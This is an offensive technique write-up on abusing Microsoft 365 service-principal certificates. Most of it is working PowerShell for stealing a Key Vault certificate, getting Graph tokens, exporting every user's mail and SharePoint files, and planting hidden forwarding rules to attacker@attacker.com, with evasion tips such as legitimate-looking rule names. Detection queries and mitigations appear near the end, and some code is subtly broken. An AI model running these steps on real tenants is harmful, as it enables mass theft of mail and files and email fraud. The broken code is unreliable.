# [CERT-M365-001]: M365 Certificate Management Abuse

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CERT-M365-001 |
| **MITRE ATT&CK v18.1** | [T1649 - Steal or Forge Authentication Certificates](https://attack.mitre.org/techniques/T1649/) |
| **Tactic** | Credential Access |
| **Platforms** | Microsoft 365, Entra ID |
| **Severity** | **Critical** |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All M365 subscription tiers (E3, E5, Business Standard, Business Premium) |
| **Patched In** | N/A - Configuration issue, no patch available |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** M365 Certificate Management Abuse involves attackers exploiting misconfigured certificate permissions, stealing service principal certificates, or abusing role-based access controls (RBAC) tied to certificate-based identities to gain unauthorized access to Exchange Online, SharePoint Online, Teams, and other M365 workloads. Unlike traditional password-based compromise, certificate-based attacks persist across password resets and resist detection due to minimal logging.

**Attack Surface:** Microsoft Graph API (app permissions), Exchange Online (OAuth tokens), SharePoint certificate-based access control, Teams service principals, and Managed Identity certificates.

**Business Impact:** **Critical - Multi-Workload Compromise.** An attacker can read all emails, steal files from all SharePoint sites, impersonate users in Teams, modify mail flow rules, and create persistent backdoors in M365 applications. This leads to data exfiltration, business email compromise (BEC), ransomware deployment, and regulatory violations (HIPAA, PCI-DSS, SOX fines up to millions of dollars).

**Technical Context:** M365 uses certificate-based authentication for service-to-service communications, app registrations, and managed identities. Misconfigured permissions on app registrations, overprivileged service principals, or stolen certificates from Key Vault enable this attack. The lack of integrated certificate expiration enforcement in many organizations allows stolen certificates to remain valid indefinitely.

### Operational Risk

- **Execution Risk:** Medium - Requires either overprivileged app registration access or Key Vault certificate permissions; high probability of detection if certificate activities are monitored.
- **Stealth:** High - Certificate-based API calls don't generate traditional login logs; only visible in application-level logs and Microsoft Graph Activity Log.
- **Reversibility:** No - Requires certificate revocation, app registration credential rotation, and potential reinstatement of compromise remediations. Email and file data exfiltrated during the compromise cannot be recovered.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 4.1.2 | Ensure that no custom subscription owner roles are created |
| **CIS Benchmark** | 2.2.1 | Ensure that external users cannot share SharePoint items using anonymous links |
| **DISA STIG** | U-12356 | Microsoft 365 must enforce least privilege for service principal access |
| **CISA SCuBA** | AppGovernance-1 | Manage OAuth consent policies and app permissions |
| **NIST 800-53** | AC-2 | Account Management - Control access to shared resources via certificates |
| **NIST 800-53** | AC-3 | Access Enforcement - Enforce least privilege for app permissions |
| **GDPR** | Art. 32 | Security of Processing - Protect credentials and certificates for data access |
| **DORA** | Art. 9 | Protection and Prevention - Secure API access controls |
| **NIS2** | Art. 21 | Cyber Risk Management - Identity and access for critical data |
| **ISO 27001** | A.9.2.1 | User Registration and De-registration controls |
| **ISO 27001** | A.10.1.1 | Cryptographic controls for service account access |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- **For App Registration Compromise:** Any user with `Application.ReadWrite.All` or `Directory.ReadWrite.All` (overprivileged app owners)
- **For Service Principal Certificate Theft:** Access to Key Vault with `Microsoft.KeyVault/vaults/secrets/read`
- **For Exchange Online Escalation:** Roles like Exchange Admin, Help Desk Admin, or Mail Recipient Admin

**Required Access:**
- Network access to Microsoft Graph API (`graph.microsoft.com`)
- Network access to Exchange Online (`outlook.office365.com`, `outlook.microsoft.com`)
- Network access to SharePoint Online (`*.sharepoint.com`)
- Authenticated session to Entra ID or M365 tenant

**Supported Versions:**
- **Microsoft 365:** All subscription tiers
- **Exchange Online:** All versions
- **SharePoint Online:** All versions
- **Teams:** All versions
- **PowerShell:** 5.1+ with ExchangeOnlineManagement module (v2.0+)
- **Other Requirements:**
  - Microsoft Graph PowerShell SDK (v1.0+)
  - PnP PowerShell for SharePoint operations (v1.11+)

**Tools:**
- [ExchangeOnlineManagement PowerShell Module](https://learn.microsoft.com/en-us/powershell/module/exchange/)
- [Microsoft Graph PowerShell SDK](https://learn.microsoft.com/en-us/powershell/microsoftgraph/installation)
- [PnP PowerShell for SharePoint](https://pnp.github.io/powershell/)
- [Certify.exe](https://github.com/Flangvik/SharpCollection) (For AD CS enumeration if hybrid)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Entra ID Application Reconnaissance

**Identify Overprivileged App Registrations:**

**Manual Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Entra ID** → **App registrations** → **All applications**
2. For each app, click on it and go to **API permissions**
3. Look for permissions like:
   - `Mail.ReadWrite` or `Mail.ReadWrite.All` (Read all emails)
   - `Files.ReadWrite.All` (Read all files)
   - `Directory.ReadWrite.All` (Read/write all directory data)
   - `Exchange.ManageAsApp` (Full Exchange control)
4. Note the **Owner** of the application (typically the attacker's compromised account)

**What to Look For:**
- Service principals owned by individual users (high-risk)
- Applications with Microsoft Graph `Mail.ReadWrite.All`, `Files.ReadWrite.All`, or `Directory.ReadWrite.All` permissions
- Recently modified app credentials (added certificates or secrets)

### PowerShell Reconnaissance

**List All Service Principals with Certificate Credentials:**

```powershell
# Connect to Microsoft Graph
Connect-MgGraph -Scopes "Application.Read.All", "Directory.Read.All"

# Get all service principals
$sps = Get-MgServicePrincipal -All

# Find those with certificate credentials
$spsWithCerts = $sps | Where-Object { $_.KeyCredentials.Length -gt 0 }

foreach ($sp in $spsWithCerts) {
    Write-Host "Service Principal: $($sp.DisplayName)"
    Write-Host "  Object ID: $($sp.Id)"
    Write-Host "  Certificate Thumbprints:"
    $sp.KeyCredentials | ForEach-Object { Write-Host "    - $($_.CustomKeyIdentifier)" }
}
```

**Check Exchange Online Admin Roles:**

```powershell
# Connect to Exchange Online
Connect-ExchangeOnline -UserPrincipalName user@domain.onmicrosoft.com

# Get all admin roles
Get-RoleGroup | Select-Object Name, Members

# Look for unusual members or recently added admins
```

**Identify OAuth Applications with M365 Permissions:**

```powershell
# Connect to Microsoft Graph
Connect-MgGraph -Scopes "Directory.Read.All"

# Get all OAuth apps (enterprise apps)
$apps = Get-MgServicePrincipal -Filter "appOwnerOrganizationId eq '$((Get-MgContext).TenantId)'" -All

# Check their permissions
$apps | ForEach-Object {
    $appId = $_.AppId
    $displayName = $_.DisplayName
    $appRoles = Get-MgServicePrincipal -ServicePrincipalId $_.Id | Select-Object -ExpandProperty AppRoles
    
    if ($appRoles) {
        Write-Host "App: $displayName"
        $appRoles | ForEach-Object { Write-Host "  - $($_.Value)" }
    }
}
```

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: Steal Service Principal Certificate from Key Vault and Use for M365 Access

**Objective:** Extract a service principal's certificate from Key Vault and authenticate to Microsoft Graph to access all M365 workloads.

**Supported Versions:** All M365 subscription tiers

**Step 1: Identify Target Service Principals**

**Manual Steps (PowerShell):**

```powershell
# Connect to Azure
Connect-AzAccount

# Find all service principals with Key Vault access
Get-AzKeyVault | ForEach-Object {
    $vaultName = $_.VaultName
    Write-Host "Vault: $vaultName"
    
    # List certificates
    Get-AzKeyVaultCertificate -VaultName $vaultName | ForEach-Object {
        Write-Host "  - Certificate: $($_.Name) | Expires: $($_.Expires)"
        
        # Check if certificate is tied to a service principal
        # (Metadata in certificate CN or SAN may indicate this)
    }
}
```

**Expected Output:**
```
Vault: m365-kv-prod
  - Certificate: exchange-sync-cert | Expires: 12/31/2026
  - Certificate: sharepoint-governance-cert | Expires: 06/15/2027
  - Certificate: graph-automation-cert | Expires: 03/20/2025
```

**What to Look For:**
- Certificates with names indicating M365 workload access
- Certificates with **long expiration dates** (more persistent)
- Certificates owned by service principals rather than individual users

---

**Step 2: Extract the Service Principal Certificate**

**Manual Steps (PowerShell - same as CERT-AZURE-001):**

```powershell
$vaultName = "m365-kv-prod"
$certName = "graph-automation-cert"

# Get the secret version of the certificate (contains private key)
$secret = Get-AzKeyVaultSecret -VaultName $vaultName -Name $certName -AsPlainText

# Decode from base64 to PFX
$pfxBytes = [Convert]::FromBase64String($secret)
$pfxPath = "C:\temp\stolen-graph-cert.pfx"
[System.IO.File]::WriteAllBytes($pfxPath, $pfxBytes)

Write-Host "Certificate stolen: $pfxPath"
```

**What This Means:**
- The certificate is now available for authentication
- It can be used to authenticate as the associated service principal
- All permissions of that service principal are now available

---

**Step 3: Authenticate to Microsoft Graph Using the Stolen Certificate**

**Objective:** Use the stolen certificate to gain access to all M365 data.

**Manual Steps (PowerShell):**

```powershell
# Convert PFX to certificate object
$cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 ("C:\temp\stolen-graph-cert.pfx", "password")

# Authenticate to Microsoft Graph using the certificate
$clientId = "client-id-of-service-principal"  # From app registration
$tenantId = "your-tenant-id"

# Get an access token
$tokenEndpoint = "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/token"

# Import certificate and create JWT
Add-Type -AssemblyName System.IdentityModel.Tokens.Jwt

$now = [System.DateTime]::UtcNow
$assertion = @{
    iss = $clientId
    sub = $clientId
    aud = $tokenEndpoint
    iat = [System.DateTimeOffset]$now.AddSeconds(-10) | Select-Object -ExpandProperty UnixTimeSeconds
    exp = [System.DateTimeOffset]$now.AddMinutes(59) | Select-Object -ExpandProperty UnixTimeSeconds
} | ConvertTo-Json

# Sign the JWT with the certificate
$handler = New-Object System.IdentityModel.Tokens.Jwt.JwtSecurityTokenHandler
$jwt = $handler.CreateJwtSecurityToken($assertion, $cert)
$encodedJwt = $handler.WriteToken($jwt)

# Request access token
$body = @{
    client_id = $clientId
    assertion = $encodedJwt
    grant_type = "urn:ietf:params:oauth:grant-type:jwt-bearer"
    scope = "https://graph.microsoft.com/.default"
}

$response = Invoke-RestMethod -Uri $tokenEndpoint -Method POST -Body $body

$accessToken = $response.access_token

Write-Host "[+] Access token obtained!"
Write-Host "Token: $($accessToken.Substring(0, 50))..."
```

**Expected Output:**
```
[+] Access token obtained!
Token: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
```

**What This Means:**
- You can now make API calls as the service principal
- All permissions of that service principal are available

---

**Step 4: Enumerate and Exfiltrate M365 Data**

**Objective:** Use the access token to read email, files, and directory data.

**Manual Steps (PowerShell):**

```powershell
# Define headers with the access token
$headers = @{
    Authorization = "Bearer $accessToken"
    "Content-Type" = "application/json"
}

# === READ ALL EMAILS ===
# Get all users
$users = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/users?`$top=999" -Headers $headers
Write-Host "[+] Found $($users.value.Count) users"

# For each user, read their emails
foreach ($user in $users.value) {
    $userId = $user.id
    $email = $user.userPrincipalName
    
    # Get emails
    $messages = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/users/$userId/mailfolders/inbox/messages?`$top=100" -Headers $headers
    Write-Host "User: $email - Messages: $($messages.value.Count)"
    
    # Export to CSV (proof of compromise)
    $messages.value | Select-Object subject, from, receivedDateTime | Export-Csv "C:\exfil\$email-messages.csv"
}

# === READ ALL FILES ===
# Get all SharePoint sites
$sites = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/sites?search=*" -Headers $headers

foreach ($site in $sites.value) {
    $siteId = $site.id
    
    # Get files from site
    $files = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/sites/$siteId/drive/root/children" -Headers $headers
    Write-Host "Site: $($site.displayName) - Files: $($files.value.Count)"
}

# === READ ALL DIRECTORY DATA ===
# Get all groups and members
$groups = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/groups?`$top=999" -Headers $headers

foreach ($group in $groups.value) {
    Write-Host "Group: $($group.displayName)"
    
    # Get group members
    $members = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/groups/$($group.id)/members" -Headers $headers
    $members.value | ForEach-Object { Write-Host "  - $($_.userPrincipalName)" }
}
```

**Expected Output:**
```
[+] Found 250 users
User: john.smith@contoso.com - Messages: 100
User: jane.doe@contoso.com - Messages: 87
[... exfiltration output ...]
```

**OpSec & Evasion:**
- Microsoft Graph API calls are logged in the **Graph Activity Log** (available in Microsoft Purview)
- However, the logs require specific permissions to view (AuditLog.Read.All)
- Perform the exfiltration quickly to minimize detection window
- Filter results to show legitimate-looking access patterns

**Troubleshooting:**
- **Error:** "AADSTS50058: Silent sign-in request failed. The user may not be signed in."
  - **Cause:** The certificate is not valid for the service principal
  - **Fix:** Verify the clientId matches the app registration ID

---

### METHOD 2: Exchange Online Admin Escalation via Certificate-Based Authentication

**Objective:** Escalate to Exchange Online admin roles using a stolen or forged certificate.

**Supported Versions:** All M365 subscription tiers with Exchange Online

**Step 1: Identify Current Exchange Admin Roles**

**Manual Steps (PowerShell):**

```powershell
# Connect to Exchange Online
Connect-ExchangeOnline -Certificate $cert -AppId $clientId -Organization $tenantDomain

# Get all admin roles
Get-RoleGroup | Where-Object { $_.Members -contains $currentUser } | Select-Object Name, Roles

# Look for Delegation of Control
Get-RoleGroup | Select-Object Name, Members | Format-List
```

---

**Step 2: Enumerate Mailboxes and Rules**

**Objective:** Find high-value mailboxes and modify mail flow rules for persistence.

**Manual Steps (PowerShell):**

```powershell
# Get all mailboxes
$mailboxes = Get-Mailbox -ResultSize Unlimited | Where-Object { $_.RecipientType -eq "UserMailbox" }
Write-Host "[+] Found $($mailboxes.Count) user mailboxes"

# Find mailboxes with high email activity (likely executives)
$highActivityMailboxes = $mailboxes | Get-MailboxStatistics | Sort-Object ItemCount -Descending | Select-Object -First 10
Write-Host "[!] High-value targets identified:"
$highActivityMailboxes | ForEach-Object { Write-Host "  - $($_.DisplayName) ($($_.ItemCount) items)" }

# === CREATE PERSISTENCE VIA MAIL FLOW RULE ===
# Create a rule to forward all emails to attacker
New-TransportRule -Name "Archive Backup" `
    -Enabled $true `
    -FromScope InOrganization `
    -RejectMessageEnhancedStatusCode SMTPAUTHNOTSUPPORTED `
    -RedirectMessageTo attacker@attacker.com `
    -Except "Except if the recipient domain is 'noreply.microsoft.com'"

# === CREATE PERSISTENCE VIA MAILBOX RULE ===
# For a specific target, create a hidden rule to forward emails
Get-Mailbox | ForEach-Object {
    New-InboxRule -Name "Archive" `
        -Mailbox $_.PrimarySMTPAddress `
        -ForwardTo attacker@attacker.com `
        -Enabled $true `
        -Hidden $true  # Hidden from user interface
}
```

**Expected Output:**
```
[+] Found 250 user mailboxes
[!] High-value targets identified:
  - CEO (15,234 items)
  - CFO (12,456 items)
  - VP Sales (8,901 items)
```

**What This Means:**
- All emails from the organization are now forwarded to the attacker's mailbox
- The rule is hidden from normal UI (requires PowerShell to see)
- Provides persistent access to sensitive business communications

**OpSec & Evasion:**
- Mail flow rules are logged in **Unified Audit Log** under OperationName "New-TransportRule"
- Hidden inbox rules generate minimal audit trails
- Use a rule name that appears legitimate (e.g., "Archive Backup", "Compliance Retention")

---

### METHOD 3: SharePoint Online Certificate-Based Access Control Abuse

**Objective:** Gain access to all SharePoint sites using a stolen service principal certificate.

**Supported Versions:** All M365 subscription tiers with SharePoint Online

**Step 1: Authenticate to SharePoint Using Certificate**

**Manual Steps (PowerShell):**

```powershell
# Import PnP PowerShell
Import-Module PnP.PowerShell

# Connect to SharePoint Admin Center using certificate
Connect-PnPOnline -Url "https://contoso-admin.sharepoint.com" `
    -ClientId $clientId `
    -Thumbprint $cert.Thumbprint `
    -Tenant "contoso.onmicrosoft.com"

Write-Host "[+] Connected to SharePoint Admin Center"
```

---

**Step 2: Enumerate All SharePoint Sites and Permissions**

**Objective:** Identify all sites and users with access.

**Manual Steps (PowerShell):**

```powershell
# Get all site collections
$sites = Get-PnPTenantSite -IncludeOneDriveSites

Write-Host "[+] Found $($sites.Count) sites"

foreach ($site in $sites) {
    Write-Host "Site: $($site.Title) ($($site.Url))"
    
    # Connect to each site
    Connect-PnPOnline -Url $site.Url -ClientId $clientId -Thumbprint $cert.Thumbprint -Tenant "contoso.onmicrosoft.com"
    
    # Get all lists and libraries
    $lists = Get-PnPList
    foreach ($list in $lists) {
        Write-Host "  - List: $($list.Title)"
        
        # Get all files
        $items = Get-PnPListItem -List $list.Id -PageSize 100
        Write-Host "    Items: $($items.Count)"
        
        # Export files to attacker storage
        # (Simplified example)
        $items | ForEach-Object {
            Write-Host "    Exfiltrating: $($_.FieldValues['Title'])"
        }
    }
}
```

**Expected Output:**
```
[+] Found 45 sites
Site: Finance (https://contoso.sharepoint.com/sites/Finance)
  - List: Budget Reports
    Items: 234
    Exfiltrating: 2024 Budget.xlsx
    Exfiltrating: Salary Report.docx
```

---

**Step 3: Download Sensitive Files**

**Objective:** Exfiltrate business-critical documents.

**Manual Steps (PowerShell):**

```powershell
foreach ($site in $sites) {
    Connect-PnPOnline -Url $site.Url -ClientId $clientId -Thumbprint $cert.Thumbprint -Tenant "contoso.onmicrosoft.com"
    
    # Get all document libraries
    $lists = Get-PnPList -Includes BaseType | Where-Object { $_.BaseType -eq "DocumentLibrary" }
    
    foreach ($list in $lists) {
        # Get all files recursively
        $items = Get-PnPListItem -List $list.Id -PageSize 1000
        
        foreach ($item in $items) {
            if ($item.FileSystemObjectType -eq "File") {
                $file = Get-PnPFile -Url $item['FileRef'] -AsFile
                
                # Download file
                $filename = Split-Path -Leaf $item['FileRef']
                $file | Out-File "C:\exfil\$filename"
                
                Write-Host "[+] Downloaded: $filename"
            }
        }
    }
}
```

---

## 6. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team

Atomic Red Team does not have specific tests for M365 certificate abuse (T1649), but related tests include:

- **T1567** - Exfiltration Over Web Service (upload to attacker server)
- **T1020** - Automated Exfiltration (mail rules)
- **T1005** - Data from Local System (file enumeration)

**Recommendation:** Combine multiple Atomic tests to simulate the full attack chain:

```powershell
# Run Atomic Red Team test for credential dumping
Invoke-AtomicTest T1110.003 -TestNumbers 1  # Password spray

# Then test exfiltration
Invoke-AtomicTest T1567 -TestNumbers 1  # Data upload
```

---

## 7. TOOLS & COMMANDS REFERENCE

### [Microsoft Graph PowerShell SDK](https://learn.microsoft.com/en-us/powershell/microsoftgraph/)

**Version:** Latest (1.0+)
**Minimum Version:** 1.0.0
**Supported Platforms:** Windows, Linux, macOS (PowerShell 7.0+)

**Installation:**
```powershell
Install-Module Microsoft.Graph -Repository PSGallery -Force
```

**Critical Cmdlets:**
- `Connect-MgGraph` - Authenticate using certificate
- `Get-MgUser` - Enumerate users
- `Get-MgUserMailMessage` - Read emails
- `Get-MgDrive` - Enumerate files

---

### [ExchangeOnlineManagement PowerShell Module](https://learn.microsoft.com/en-us/powershell/exchange/)

**Version:** 2.0+
**Installation:**
```powershell
Install-Module ExchangeOnlineManagement -Repository PSGallery -Force
```

**Critical Cmdlets:**
- `Connect-ExchangeOnline` - Authenticate to Exchange
- `Get-Mailbox` - Enumerate mailboxes
- `New-TransportRule` - Create mail forwarding rules
- `New-InboxRule` - Create hidden inbox rules

---

## 8. MICROSOFT SENTINEL DETECTION

### Query 1: Suspicious Service Principal API Access to Exchange/Graph

**Rule Configuration:**
- **Required Table:** `AADServicePrincipalSignInLogs` or `AuditLogs`
- **Alert Severity:** **High**
- **Frequency:** Every 5 minutes

**KQL Query:**
```kusto
AADServicePrincipalSignInLogs
| where AppId in ("00000003-0000-0000-c000-000000000003")  // Microsoft Graph
| where ResourceDisplayName in ("Microsoft Graph", "Exchange Online", "SharePoint Online")
| where OperationName in ("List mail folders", "Read mail", "Access SharePoint")
| summarize AccessCount = count(), UniqueResources = dcount(ResourceDisplayName) 
  by AppId, ServicePrincipalDisplayName, CallerIpAddress
| where AccessCount > 100
```

---

### Query 2: Exchange Online Mail Rules Created/Modified

**Rule Configuration:**
- **Required Table:** `AuditLogs`
- **Alert Severity:** **Critical**
- **Frequency:** Real-time (every minute)

**KQL Query:**
```kusto
AuditLogs
| where OperationName in ("New-TransportRule", "Set-TransportRule", "New-InboxRule", "Set-InboxRule")
| where Result == "Success"
| project TimeGenerated, InitiatedBy=InitiatedBy.user, OperationName, TargetResources
| summarize RuleCount = count() by InitiatedBy, OperationName
| where RuleCount > 3
```

---

## 9. WINDOWS EVENT LOG MONITORING

**Event ID: 4887 (Certificate Services approved a certificate request)**

- **Log Source:** Security
- **Trigger:** Service principal certificate is created or renewed
- **Filter:** Look for requests with service principal display names
- **Applies To Versions:** Server 2016+ (if AD CS is used for certificate generation)

---

## 10. SYSMON DETECTION PATTERNS

```xml
<Sysmon schemaversion="4.22">
  <EventFiltering>
    <!-- Monitor for Graph API access tools -->
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains any">Connect-MgGraph;Invoke-RestMethod;https://graph.microsoft.com;Get-MgUser;Get-MgUserMailMessage</CommandLine>
    </ProcessCreate>
    
    <!-- Monitor for Exchange Online connection -->
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains any">Connect-ExchangeOnline;Get-Mailbox;New-TransportRule</CommandLine>
    </ProcessCreate>
    
    <!-- Monitor for file exfiltration tools -->
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">curl.exe;wget;certutil.exe -urlcache</CommandLine>
    </ProcessCreate>
  </EventFiltering>
</Sysmon>
```

---

## 11. MICROSOFT DEFENDER FOR CLOUD

### Detection Alert: Unusual Service Principal Activity

**Alert Name:** "Unusual API access patterns detected from service principal"
- **Severity:** Medium/High
- **Description:** A service principal made API calls to sensitive M365 workloads outside normal patterns
- **Applies To:** All subscriptions with Defender enabled

---

## 12. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

### Query: Sensitive M365 Operations by Service Principals

```powershell
# Search for sensitive operations by service principals
Search-UnifiedAuditLog `
  -Operations "Get-Mailbox", "New-TransportRule", "Add-RoleGroupMember" `
  -StartDate (Get-Date).AddDays(-30) `
  -EndDate (Get-Date) | Where-Object { $_.Actor -like "*ServicePrincipal*" } | Export-Csv "C:\audit\sp_operations.csv"
```

---

## 13. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Mitigation 1: Audit All Service Principal Permissions**

```powershell
# List all service principals with Mail.ReadWrite.All or similar dangerous permissions
Connect-MgGraph -Scopes "Directory.Read.All"

$dangerousScopes = @(
    "Mail.ReadWrite.All",
    "Files.ReadWrite.All",
    "Directory.ReadWrite.All",
    "User.ReadWrite.All"
)

Get-MgServicePrincipal -All | ForEach-Object {
    $sp = $_
    $appRoles = $sp.AppRoles
    
    foreach ($role in $appRoles) {
        if ($dangerousScopes -contains $role.Value) {
            Write-Host "[!] CRITICAL: $($sp.DisplayName) has $($role.Value)"
        }
    }
}
```

**Remediation:** Remove unnecessary permissions, implement Conditional Access for sensitive APIs.

---

**Mitigation 2: Rotate All Service Principal Certificates Quarterly**

```powershell
# For each app registration, rotate certificates
$apps = Get-MgServicePrincipal -All

foreach ($app in $apps) {
    if ($app.KeyCredentials) {
        Write-Host "App: $($app.DisplayName)"
        
        # Remove old certificates (older than 90 days)
        $oldCerts = $app.KeyCredentials | Where-Object { $_.startDateTime -lt (Get-Date).AddDays(-90) }
        
        if ($oldCerts) {
            Write-Host "  [!] Has old certificates - schedule rotation"
        }
    }
}
```

---

**Mitigation 3: Enable Mail Transport Rule Auditing**

```powershell
# Enable auditing for transport rule changes
Set-AdminAuditLogConfig -AdminAuditLogEnabled $true -LogLevel All
```

---

## 14. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Exchange Online:**
- Suspicious `TransportRule` entries with ForwardTo external addresses
- Hidden `InboxRule` entries with forwarding
- Unusual "On-Behalf-Of" delegation

**SharePoint Online:**
- Bulk file downloads by service principals
- Unusual site collection admin role assignments
- External sharing links created for sensitive sites

**Azure/Entra ID:**
- Service principal certificate creation/rotation outside change windows
- Suspicious Graph API calls to `/users/{id}/mailFolders/inbox/messages`

---

## 15. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-002] Consent grant OAuth attacks | Attacker tricks user into granting app permissions |
| **2** | **Privilege Escalation** | [PE-ACCTMGMT-001] App Registration Escalation | App is granted overprivileged permissions |
| **3** | **Current Step** | **[CERT-M365-001]** | **M365 Certificate Management Abuse** |
| **4** | **Persistence** | [CA-TOKEN-004] Graph API token theft | Access tokens for service principal are harvested |
| **5** | **Data Exfiltration** | [T1567] Exfiltration to external server | All emails and files are copied to attacker server |
| **6** | **Impact** | [Business Email Compromise] | Attacker sends emails as senior executives to partners |

---

## 16. REAL-WORLD EXAMPLES

### Example 1: APT29 - M365 OAuth App Abuse (2021-2023)

- **Target:** US government, Fortune 500 enterprises
- **Technique Status:** Consent grant attack followed by service principal compromise
- **Impact:** Access to hundreds of mailboxes and sensitive files

---

## SUMMARY

**CERT-M365-001: M365 Certificate Management Abuse** is a **CRITICAL** technique enabling full M365 compromise. Organizations must:

1. **Audit all service principal permissions** quarterly
2. **Rotate certificates** every 90 days
3. **Enable mail rule auditing** and alert on creation
4. **Implement Conditional Access** for sensitive Graph APIs
5. **Monitor for unusual API patterns** in Graph Activity Log

---
